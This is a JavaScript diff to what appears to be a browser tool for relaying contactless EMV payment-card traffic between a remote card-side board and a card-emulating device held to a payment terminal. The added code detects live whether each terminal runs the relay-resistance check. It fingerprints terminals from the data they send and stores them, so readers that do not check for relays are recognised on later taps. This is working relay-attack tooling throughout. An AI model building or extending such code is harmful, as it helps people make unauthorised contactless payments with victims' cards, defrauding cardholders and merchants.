@@ -18,7 +18,7 @@
  */
 'use strict';
 
-const BUILD = '2026-09-08n rrp-reader-badge';   // shown in the log so you can confirm which version loaded
+const BUILD = '2026-09-08o reader-list';   // shown in the log so you can confirm which version loaded
 
 // --- Nordic UART Service (verified in firmware ble_main.c / ble_nus) ---------
 const NUS_SERVICE = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
@@ -462,6 +462,10 @@ document.addEventListener('visibilitychange', () => { if (document.visibilitySta
 let running = false;
 let apduCount = 0;
 let rrpSeenThisRun = false;              // did the terminal send 80 EA (RRP) this session?
+let rrpResolved = false;                 // badge settled to a verdict live (past GPO, no 80 EA)
+let curPdol = null, curCdol1 = null;    // this card's DOL layouts (from SELECT / READ RECORD)
+let curTermData = {};                    // terminal tags captured from GPO/GENERATE AC this run
+let recognisedThisRun = false;           // logged a store match already this run?
 let cacheCount = 0;                      // static entries currently in the ghost (host's view)
 const cachedCmds = new Set();           // hex of cmds cached this session (dedupe on pre-fill load)
 let clearRequested = false;             // Clear-cache asked while the relay loop is running
@@ -649,7 +653,8 @@ async function startRelay() {
   // mole-facing side: the local board (Local mode) or the remote mole over WS (Ghost mode)
   const M = (role === 'ghost') ? wsLink.mole : mole;
   if (role === 'ghost' && !wsLink.connected) { log('not connected to the relay server', 'err'); return; }
-  running = true; apduCount = 0; rrpSeenThisRun = false; setRrpBadge('watch');
+  running = true; apduCount = 0; rrpSeenThisRun = false; rrpResolved = false; setRrpBadge('watch');
+  curPdol = null; curCdol1 = null; curTermData = {}; recognisedThisRun = false;
   acquireWakeLock();
   updateStartEnabled();
   const mode = document.querySelector('input[name=mode]:checked').value;
@@ -775,6 +780,8 @@ async function startRelay() {
         log('--- new transaction (tap) --- re-opening mole session', 'ok');
         await cloneFromMole(M, slot);   // fresh card session for a fresh cryptogram
         apduCount = 0;
+        curPdol = null; curCdol1 = null;   // DOL layouts are per-card/per-tap
+        if (!rrpSeenThisRun) rrpResolved = false;  // re-watch RRP for the new tap
       }
       sawIdle = false;
       // Terminal RRP enforcement: EXCHANGE RELAY RESISTANCE DATA (80 EA). If the
@@ -783,6 +790,24 @@ async function startRelay() {
         if (!rrpSeenThisRun) log('⚠ terminal sent EXCHANGE RELAY RESISTANCE DATA (80 EA) — this reader ENFORCES RRP; the relay is being time-checked', 'warn');
         rrpSeenThisRun = true; setRrpBadge('enforced');
       }
+      // Live RRP verdict: RRP (80 EA) is sent BETWEEN GPO and READ RECORD, so the
+      // moment we relay a READ RECORD (00 B2) with no prior 80 EA this reader did
+      // not run RRP on this tap — settle the badge now instead of waiting for Stop.
+      if (apdu.length >= 2 && apdu[0] === 0x00 && apdu[1] === 0xB2 && !rrpSeenThisRun && !rrpResolved) {
+        rrpResolved = true; setRrpBadge('clear');
+        log('reached READ RECORD with no 80 EA — reader did NOT run RRP on this tap', 'ok');
+      }
+      // Terminal fingerprint: GPO command carries PDOL data (tag 83) if the card
+      // has a PDOL; GENERATE AC command carries CDOL1 data. Parse against the
+      // layout we learned from this card's SELECT/READ responses.
+      if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xA8 && curPdol && apdu.length > 5) {
+        const inner = tlvFind(apdu.slice(5, 5 + apdu[4]), 0x83)[0];
+        if (inner) { mergeTermData(curTermData, parseDolData(curPdol, inner)); noteReader(); }
+      }
+      if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xAE && curCdol1 && apdu.length > 5) {
+        mergeTermData(curTermData, parseDolData(curCdol1, apdu.slice(5, 5 + apdu[4])));
+        noteReader();
+      }
       setLedUI('ghost', 'blue'); setLedUI('mole', 'blue');
       const tGot = performance.now();
       let rr;
@@ -790,6 +815,13 @@ async function startRelay() {
       catch (_) { rr = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
       const tRelay = performance.now();
       const resp = rr.status === ST.HF_TAG_OK ? rr.data : new Uint8Array(0);
+      // Learn this card's DOL layouts from its responses so we can decode the
+      // terminal data the reader sends next: SELECT (00 A4) FCI -> PDOL (9F38);
+      // READ RECORD (00 B2) -> CDOL1 (8C).
+      if (resp.length) {
+        if (apdu[0] === 0x00 && apdu[1] === 0xA4) { const p = tlvFind(resp, 0x9f38)[0]; if (p) curPdol = p; }
+        if (apdu[0] === 0x00 && apdu[1] === 0xB2 && !curCdol1) { const c = tlvFind(resp, 0x8c)[0]; if (c) curCdol1 = c; }
+      }
       // Session auto-recovery: if the card decouples mid-transaction the mole
       // fast-fails (empty) on every APDU and a chatty reader loops forever. After a
       // few consecutive empties, re-clone the mole session so it recovers the moment
@@ -945,6 +977,15 @@ function stopRelay() {
   } else {
     setRrpBadge('none');
   }
+  // Persist / update this reader in the stored list.
+  const verdict = rrpSeenThisRun ? 'enforced' : (apduCount > 0 ? 'no-ea' : 'idle');
+  const rec = recordReader(curTermData, verdict);
+  if (rec) {
+    log(`reader stored: "${rec.name}" — ${rrpLabel(rec.rrp)} · ${readerSummary(curTermData)} (seen ${rec.seen}×). Rename in Readers.`, 'ok');
+    renderReaders();
+  } else if (apduCount > 0) {
+    log('reader not stored: no terminal fingerprint captured (empty-PDOL card, blocked before GENERATE AC). RRP verdict shown above.', 'warn');
+  }
 }
 
 // Diagnostic: dump the raw reader frames the ghost captured (cmd 6009), so we can
@@ -1015,6 +1056,119 @@ function buildDol(dol) {
     parts.push(dolValue(tag, len));
   }
   return concat(...parts);
+}
+
+// --- Reader recognition + store ---------------------------------------------
+// A terminal has no UID to advertise, so we fingerprint it from the terminal
+// data it leaks INTO the transaction: PDOL data (GPO) if the card has a PDOL,
+// else CDOL data (GENERATE AC). Stable tags only (country/type/caps/TTQ/IDs) —
+// volatile ones (unpredictable number, amount, date/time, TVR, ATC) are excluded
+// so the same reader fingerprints identically tap to tap. Two identical POS
+// units with no unique Terminal ID (9F1C) collide -> rename to disambiguate.
+// Reverse of buildDol: split concatenated DOL values back into a tag->bytes map.
+function parseDolData(dol, data) {
+  const out = {}; let i = 0, di = 0;
+  while (i < dol.length) {
+    let tag = dol[i], tl = 1;
+    if ((dol[i] & 0x1f) === 0x1f) { tag = (dol[i] << 8) | dol[i + 1]; tl = 2; }
+    i += tl; if (i >= dol.length) break;
+    const len = dol[i++];
+    out[tag] = data.slice(di, di + len); di += len;
+  }
+  return out;
+}
+// Stable terminal-identifying tags (label + fingerprint inclusion).
+const RDR_TAGS = {
+  0x9F1A: 'country', 0x9F35: 'termType', 0x9F33: 'caps', 0x9F40: 'addlCaps',
+  0x9F66: 'ttq', 0x9F1C: 'termId', 0x9F1E: 'ifdSerial', 0x9F4E: 'merchant',
+  0x9F16: 'merchantId', 0x9F15: 'mcc', 0x9F3C: 'refCurrency', 0x9F1D: 'termRiskMgmt',
+};
+function mergeTermData(dst, td) { for (const t in td) { if (RDR_TAGS[t] && td[t] && td[t].length) dst[t] = td[t]; } }
+function readerFingerprint(td) {
+  const parts = [];
+  for (const t of Object.keys(RDR_TAGS).map(Number).sort((a, b) => a - b))
+    if (td[t] && td[t].length) parts.push(t.toString(16) + ':' + hxc(td[t]));
+  return parts.join('|');
+}
+const CTRY = { '0056': 'BE', '0250': 'FR', '0276': 'DE', '0528': 'NL', '0826': 'GB', '0840': 'US', '0724': 'ES', '0380': 'IT' };
+function readerSummary(td) {
+  const bits = [];
+  if (td[0x9F1A]) { const c = hxc(td[0x9F1A]); bits.push('country ' + (CTRY[c] || c)); }
+  if (td[0x9F35]) bits.push('type ' + hxc(td[0x9F35]));
+  if (td[0x9F66]) bits.push('TTQ ' + hxc(td[0x9F66]));
+  if (td[0x9F1C]) bits.push('termID ' + hxc(td[0x9F1C]));
+  if (td[0x9F1E]) bits.push('IFD ' + hxc(td[0x9F1E]));
+  return bits.join(' · ') || 'no terminal data captured';
+}
+function loadReaders() { try { return JSON.parse(localStorage.getItem('emvReaders') || '[]'); } catch (_) { return []; } }
+function saveReaders(r) { try { localStorage.setItem('emvReaders', JSON.stringify(r)); } catch (_) {} }
+// Save/merge a reader after a session. Matches by fingerprint when we captured
+// one; otherwise stores an unrecognisable entry (empty-PDOL card, blocked before
+// GENERATE AC) that the user names by hand. verdict: enforced|no-ea|idle.
+function recordReader(td, verdict) {
+  const fp = readerFingerprint(td);
+  if (!fp && verdict === 'idle') return null;       // nothing worth storing
+  const list = loadReaders();
+  const now = Date.now();
+  let r = fp ? list.find(x => x.fp === fp) : null;
+  if (r) {
+    r.seen++; r.last = now; r.tags = td && Object.keys(td).length ? hexTags(td) : r.tags;
+    if (verdict === 'enforced') r.rrp = 'enforced';
+    else if (verdict === 'no-ea' && r.rrp !== 'enforced') r.rrp = 'no-ea';
+  } else {
+    r = { id: 'r' + now.toString(36), name: 'Reader ' + (list.length + 1), fp,
+          tags: hexTags(td), rrp: verdict, seen: 1, first: now, last: now };
+    list.push(r);
+  }
+  saveReaders(list);
+  return r;
+}
+function hexTags(td) { const o = {}; for (const t in td) if (td[t]) o[t] = hxc(td[t]); return o; }
+function rrpLabel(v) { return v === 'enforced' ? '⚠ enforces RRP' : v === 'no-ea' ? '✓ no RRP seen' : v === 'idle' ? '— (no flow)' : '?'; }
+// Called mid-run once we've captured terminal data: if its fingerprint matches a
+// stored reader, announce the recognition once.
+function noteReader() {
+  if (recognisedThisRun) return;
+  const fp = readerFingerprint(curTermData);
+  if (!fp) return;
+  const hit = loadReaders().find(x => x.fp === fp);
+  if (hit) { recognisedThisRun = true; log(`recognised reader: "${hit.name}" (${rrpLabel(hit.rrp)}, seen ${hit.seen}×) — ${readerSummary(curTermData)}`, 'ok'); }
+  else { recognisedThisRun = true; log(`new reader fingerprint — ${readerSummary(curTermData)} (saved on Stop)`, 'ok'); }
+}
+function unhexTags(t) { const o = {}; for (const k in (t || {})) o[k] = hexToBytes(t[k]); return o; }
+function esc(s) { return String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c])); }
+// Render the stored-reader table into #readers-panel.
+function renderReaders() {
+  const panel = $('readers-panel'); if (!panel) return;
+  const list = loadReaders().sort((a, b) => b.last - a.last);
+  if (!list.length) { panel.innerHTML = '<div style="color:var(--muted);padding:8px 4px">No readers stored yet. Run a relay against a reader (RRP verdict is stored even when no fingerprint is captured, but only fingerprinted readers auto-recognise).</div>'; return; }
+  let h = '<table style="width:100%;border-collapse:collapse;font-size:12px">'
+        + '<tr style="color:var(--muted);text-align:left"><th style="padding:4px 6px">Reader</th><th>RRP</th><th>Terminal</th><th>Seen</th><th>Last</th><th></th></tr>';
+  for (const r of list) {
+    const sum = r.fp ? readerSummary(unhexTags(r.tags)) : '(no fingerprint — name it yourself)';
+    h += `<tr style="border-top:1px solid var(--line)">`
+       + `<td style="padding:4px 6px;font-weight:600">${esc(r.name)}</td>`
+       + `<td>${esc(rrpLabel(r.rrp))}</td>`
+       + `<td style="color:var(--muted)">${esc(sum)}</td>`
+       + `<td>${r.seen}</td>`
+       + `<td style="color:var(--muted)">${new Date(r.last).toLocaleDateString()}</td>`
+       + `<td style="white-space:nowrap"><button class="rdr-rename" data-id="${r.id}" style="padding:3px 8px">Rename</button> <button class="rdr-del" data-id="${r.id}" style="padding:3px 8px">Delete</button></td>`
+       + `</tr>`;
+  }
+  panel.innerHTML = h + '</table>';
+}
+function toggleReaders() {
+  const panel = $('readers-panel'); if (!panel) return;
+  panel.hidden = !panel.hidden;
+  if (!panel.hidden) renderReaders();
+}
+function renameReader(id) {
+  const list = loadReaders(); const r = list.find(x => x.id === id); if (!r) return;
+  const name = prompt('Reader name:', r.name); if (name == null) return;
+  r.name = name.trim() || r.name; saveReaders(list); renderReaders();
+}
+function deleteReader(id) {
+  const list = loadReaders().filter(x => x.id !== id); saveReaders(list); renderReaders();
 }
 
 // Payment-flow latency test on YOUR OWN card (mole-driven, no POS). Runs
@@ -1137,6 +1291,12 @@ window.addEventListener('DOMContentLoaded', () => {
   $('clearcache-btn').onclick = clearCache;
   if ($('rrp-btn')) $('rrp-btn').onclick = checkRRP;
   if ($('genac-btn')) $('genac-btn').onclick = testPayment;
+  if ($('readers-btn')) $('readers-btn').onclick = toggleReaders;
+  if ($('readers-panel')) $('readers-panel').addEventListener('click', e => {
+    const b = e.target.closest('button'); if (!b) return;
+    if (b.classList.contains('rdr-rename')) renameReader(b.dataset.id);
+    else if (b.classList.contains('rdr-del')) deleteReader(b.dataset.id);
+  });
   $('link-btn').onclick = toggleLink;
   $('wake-btn').onclick = wakeServer;
   document.querySelectorAll('input[name=role]').forEach(r => r.addEventListener('change', applyRole));
